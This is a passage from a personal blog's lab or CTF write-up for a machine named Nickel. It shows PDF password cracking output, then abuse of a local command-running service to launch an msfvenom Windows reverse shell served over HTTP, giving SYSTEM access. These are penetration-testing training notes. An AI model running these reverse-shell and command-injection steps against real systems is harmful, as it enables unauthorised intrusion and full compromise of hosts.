+</span></span><span class="line"><span class="cl">U: 6aa1a24681b93038947f76796470dbb100000000000000000000000000000000
+</span></span><span class="line"><span class="cl">O: d9363dc61ac080ac4b9dad4f036888567a2d468a6703faf6216af1eb307921b0
+</span></span><span class="line"><span class="cl">Average Speed: 98215.8 w/s. Current Word: <span class="s1">&#39;breaxx&#39;</span>
+</span></span><span class="line"><span class="cl">Average Speed: 96516.4 w/s. Current Word: <span class="s1">&#39;seshy16&#39;</span>
+</span></span><span class="line"><span class="cl">Average Speed: 96277.8 w/s. Current Word: <span class="s1">&#39;mantisoy&#39;</span>
+</span></span><span class="line"><span class="cl">Average Speed: 98903.3 w/s. Current Word: <span class="s1">&#39;graciel098&#39;</span>
+</span></span><span class="line"><span class="cl">Average Speed: 97724.6 w/s. Current Word: <span class="s1">&#39;bbone&#39;</span>
+</span></span><span class="line"><span class="cl">found user-password: <span class="s1">&#39;ariah4168&#39;</span>
+</span></span></code></pre></div><p>I cracked the password with pdfcrack.</p>
+<p><img src="Nickel%20cff91a47fb794eae8107f3436b0f1748/info.png" alt="info.png"></p>
+<p>The pdf contains some internal service information.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ariah@NICKEL C:<span class="se">\U</span>sers<span class="se">\a</span>riah&gt;curl http://localhost/?whoami
+</span></span><span class="line"><span class="cl">&lt;!doctype html&gt;&lt;html&gt;&lt;body&gt;dev-api started at 2023-02-17T09:16:22
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        &lt;pre&gt;nt authority<span class="se">\s</span>ystem
+</span></span><span class="line"><span class="cl">&lt;/pre&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;&lt;/html&gt;
+</span></span></code></pre></div><p>This service is run by the administrator and execute any command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/opt/generic<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.45.169 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f exe &gt; shell.exe
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x86 from the payload
+</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
+</span></span><span class="line"><span class="cl">Payload size: <span class="m">324</span> bytes
+</span></span><span class="line"><span class="cl">Final size of exe file: <span class="m">73802</span> bytes
+</span></span><span class="line"><span class="cl">                                                                                                                             
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/opt/generic<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 -m http.server <span class="m">80</span>                                                              
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</span></span><span class="line"><span class="cl">192.168.249.99 - - <span class="o">[</span>08/Oct/2023 02:12:54<span class="o">]</span> <span class="s2">&#34;GET /shell.exe HTTP/1.1&#34;</span> <span class="m">200</span> -
+</span></span></code></pre></div><p>I created shell.exe using Msfvenom  and uploaded to the server.</p>
+<p><img src="Nickel%20cff91a47fb794eae8107f3436b0f1748/urlencoder.png" alt="urlencoder.png"></p>
+<p>I encoded the command: <code>cmd /c C:\Users\ariah\Music\shell.exe</code> using url encoder.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ariah@NICKEL C:<span class="se">\U</span>sers<span class="se">\a</span>riah<span class="se">\M</span>usic&gt;curl http://localhost/?cmd%20%2Fc%20C%3A%5CUsers%5Cariah%5CMusic%5Cshell.exe
+</span></span></code></pre></div><p>I executed the curl command and got the shell.</p>
+<p><img src="Nickel%20cff91a47fb794eae8107f3436b0f1748/root.png" alt="root.png"></p>
+<h1 id="summary">Summary</h1>
+<p>Relying solely on browser output can be unreliable. Utilizing tools like curl or wget in the terminal with various options (GET, POST, PUT) provides a more thorough enumeration. Additionally, the unexpected inclusion of steganography highlights the importance of keeping it in mind during assessments.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/kei5uke" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 kei5uke.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank"  rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
